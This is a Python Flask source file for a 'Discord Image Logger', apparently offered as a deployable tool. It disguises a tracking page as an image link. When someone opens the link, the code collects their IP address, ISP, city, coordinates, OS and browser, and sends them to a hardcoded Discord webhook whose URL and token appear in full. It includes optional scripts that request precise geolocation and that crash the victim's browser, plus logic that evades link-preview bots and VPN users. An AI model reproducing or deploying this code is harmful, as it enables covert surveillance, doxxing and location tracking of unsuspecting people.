# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted
# Adapted for Vercel/Flask with 100% logic retention

from flask import Flask, request, make_response, redirect
from urllib import parse
import traceback, requests, base64, httpagentparser

app = Flask(__name__)

# --- CONFIGURATION START ---
config = {
    "webhook": "https://discord.com/api/webhooks/1436665807601012878/c0DeklbWYrZjK71YSC672nVuLNa8WNPLeN-c_GxZ5dqA7hv3fg0MMa40TqI_fI2X5zpU",
    "image": "https://i.hizliresim.com/e41xq3y.png", 
    "imageArgument": True, 
    "username": "Image Logger", 
    "color": 0x00FFFF, 
    "crashBrowser": False, 
    "accurateLocation": False, 
    "message": { 
        "doMessage": False, 
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", 
        "richMessage": True, 
    },
    "vpnCheck": 1, 
    "linkAlerts": True, 
    "buggedImage": True, 
    "antiBot": 1, 
    "redirect": {
        "redirect": False, 
        "page": "https://your-link.here" 
    },
}

blacklistedIPs = ("27", "104", "143", "164")
binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}
# --- CONFIGURATION END ---

def botCheck(ip, useragent):
    if not ip: return False
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{"title": "Image Logger - Error", "color": config["color"], "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```"}]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs): return
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{"title": "Image Logger - Link Sent", "color": config["color"], "description": f"Link sent in chat!\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`"}]
            })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    if info.get("proxy"):
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"): return
        if config["antiBot"] == 3: return
        if config["antiBot"] == 2 and not info.get("proxy"): ping = ""
        if config["antiBot"] == 1: ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**\n**Endpoint:** `{endpoint}`\n\n**IP Info:**\n> **IP:** `{ip}`\n> **Provider:** `{info.get('isp', 'Unknown')}`\n> **Country:** `{info.get('country', 'Unknown')}`\n> **Region:** `{info.get('regionName', 'Unknown')}`\n> **City:** `{info.get('city', 'Unknown')}`\n> **Coords:** `{str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise'})\n> **VPN:** `{info.get('proxy')}`\n\n**PC Info:**\n> **OS:** `{os}`\n> **Browser:** `{browser}`\n\n**User Agent:**\n```\n{useragent}\n```""",
        }]
    }
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json=embed)
    return info

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def handler(path):
    try:
        ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
        useragent = request.headers.get('user-agent', '')
        
        url = config["image"]
        if config["imageArgument"]:
            arg_url = request.args.get('url') or request.args.get('id')
            if arg_url:
                try: url = base64.b64decode(arg_url).decode()
                except: pass

        if ip.startswith(blacklistedIPs): return "", 204
        
        if botCheck(ip, useragent):
            makeReport(ip, useragent, endpoint=request.path, url=url)
            if config["buggedImage"]:
                response = make_response(binaries["loading"])
                response.headers.set('Content-Type', 'image/jpeg')
                return response
            return redirect(url)
        
        location_data = request.args.get('g')
        coords = base64.b64decode(location_data).decode() if location_data and config["accurateLocation"] else None
        result = makeReport(ip, useragent, coords, request.path, url=url)

        if config["redirect"]["redirect"]: return redirect(config["redirect"]["page"])

        message = config["message"]["message"]
        if config["message"]["richMessage"] and result:
            replacements = {
                "{ip}": ip, "{isp}": result.get("isp"), "{country}": result.get("country"),
                "{city}": result.get("city"), "{lat}": str(result.get("lat")), "{long}": str(result.get("lon")),
                "{os}": httpagentparser.simple_detect(useragent)[0], "{browser}": httpagentparser.simple_detect(useragent)[1]
            }
            for k, v in replacements.items(): message = message.replace(k, str(v))

        data = f"<html><style>body {{ margin: 0; }} div.img {{ background-image: url('{url}'); background-size: contain; background-repeat: no-repeat; background-position: center; width: 100vw; height: 100vh; }}</style><body>"
        data += f"<div>{message}</div>" if config["message"]["doMessage"] else '<div class="img"></div>'
        
        if config["crashBrowser"]:
            data += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

        if config["accurateLocation"] and not location_data:
            data += """<script>navigator.geolocation.getCurrentPosition(function(c){
                let u = new URL(window.location.href); u.searchParams.set('g', btoa(c.coords.latitude+','+c.coords.longitude)); location.replace(u);
            });</script>"""
        
        data += "</body></html>"
        res = make_response(data)
        res.headers.set('Content-Type', 'text/html')
        return res

    except Exception:
        reportError(traceback.format_exc())
        return "Internal Error", 500

if __name__ == '__main__':
    app.run()
    
